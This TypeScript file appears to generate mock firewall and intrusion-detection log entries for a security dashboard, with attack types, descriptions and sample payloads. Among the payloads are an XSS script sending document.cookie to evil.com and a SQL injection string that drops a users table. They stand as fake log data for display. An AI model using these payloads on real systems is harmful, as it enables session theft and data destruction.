import { LogEntry } from '../types';

const attackTypes = [
  'DDoS', 'SQL Injection', 'XSS', 'Brute Force', 'Port Scan',
  'Malware', 'Phishing', 'Unauthorized Access', 'Data Exfiltration', 'Privilege Escalation'
] as const;

const severities = ['critical', 'high', 'medium', 'low', 'info'] as const;
const statuses = ['active', 'blocked', 'investigating', 'resolved'] as const;
const protocols = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'SSH', 'FTP', 'SMTP', 'DNS'];
const countries = ['CN', 'RU', 'KP', 'IR', 'BR', 'US', 'DE', 'FR', 'IN', 'NG', 'UA', 'VN'];
const firewalls = ['FW-Primary', 'FW-Secondary', 'FW-DMZ', 'IDS-01', 'IPS-01', 'WAF-01'];

const descriptions: Record<string, string[]> = {
  'DDoS': ['SYN flood detected from multiple sources', 'UDP amplification attack detected', 'HTTP flood targeting web server', 'Slowloris attack pattern identified'],
  'SQL Injection': ['UNION-based injection attempt on login form', 'Blind SQL injection on API endpoint', 'Time-based injection detected in search parameter', 'Second-order SQLi via stored procedure'],
  'XSS': ['Reflected XSS in search parameter', 'Stored XSS in comment field', 'DOM-based XSS via URL fragment', 'XSS payload in HTTP header'],
  'Brute Force': ['Multiple failed SSH login attempts', 'RDP brute force from external IP', 'API key brute force detected', 'Password spray attack on admin portal'],
  'Port Scan': ['Sequential port scan detected (1-1024)', 'SYN stealth scan identified', 'UDP scan on critical infrastructure', 'Service enumeration via banner grabbing'],
  'Malware': ['Known malware signature detected in upload', 'C2 beacon traffic pattern identified', 'Ransomware file encryption behavior', 'Trojan dropper in email attachment'],
  'Phishing': ['Suspicious email with malicious link', 'Domain spoofing detected', 'Credential harvesting page identified', 'Business email compromise attempt'],
  'Unauthorized Access': ['Access attempt to restricted resource', 'Invalid API token usage', 'Session hijacking attempt', 'Authentication bypass detected'],
  'Data Exfiltration': ['Large outbound data transfer detected', 'DNS tunneling for data exfiltration', 'Unusual database query pattern', 'Encrypted data sent to unknown endpoint'],
  'Privilege Escalation': ['Local privilege escalation exploit', 'Token manipulation detected', 'Sudo rights abuse identified', 'Kernel exploit attempt']
};

function randomIP(): string {
  return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function randomTimestamp(hoursBack: number): string {
  const now = new Date();
  const past = new Date(now.getTime() - Math.random() * hoursBack * 60 * 60 * 1000);
  return past.toISOString();
}

function generatePayload(attackType: string): string {
  const payloads: Record<string, string> = {
    'SQL Injection': "1' OR '1'='1'; DROP TABLE users;--",
    'XSS': '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    'DDoS': 'SYN flood: 50000 packets/sec from 192.168.x.x',
    'Brute Force': 'Failed login attempt #247 for user admin',
    'Port Scan': 'Nmap scan: -sS -sV -O target:10.0.0.0/24',
    'Malware': 'SHA256: a1b2c3d4e5f6... matched: Trojan.Win32.Generic',
    'Phishing': 'From: support@amaz0n-security.com Subject: Account Verification Required',
    'Unauthorized Access': 'GET /admin/config HTTP/1.1 - 403 Forbidden',
    'Data Exfiltration': 'Outbound: 2.3GB to 45.33.32.156:443 (unknown cert)',
    'Privilege Escalation': 'CVE-2024-1234 exploit attempt: kernel privilege escalation'
  };
  return payloads[attackType] || 'N/A';
}

export function generateLogs(count: number = 200): LogEntry[] {
  const logs: LogEntry[] = [];

  for (let i = 0; i < count; i++) {
    const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
    const severity = severities[Math.floor(Math.random() * severities.length)];
    const descList = descriptions[attackType];
    const desc = descList[Math.floor(Math.random() * descList.length)];

    logs.push({
      id: `LOG-${String(i + 1).padStart(5, '0')}`,
      timestamp: randomTimestamp(72),
      sourceIP: randomIP(),
      destinationIP: `10.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
      sourcePort: Math.floor(Math.random() * 65535),
      destinationPort: [22, 80, 443, 3306, 5432, 8080, 8443, 3389, 25, 53][Math.floor(Math.random() * 10)],
      protocol: protocols[Math.floor(Math.random() * protocols.length)],
      attackType,
      severity,
      status: statuses[Math.floor(Math.random() * statuses.length)],
      description: desc,
      payload: generatePayload(attackType),
      country: countries[Math.floor(Math.random() * countries.length)],
      firewall: firewalls[Math.floor(Math.random() * firewalls.length)],
      signature: `SIG-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
    });
  }

  return logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export const sampleLogs = generateLogs(200);
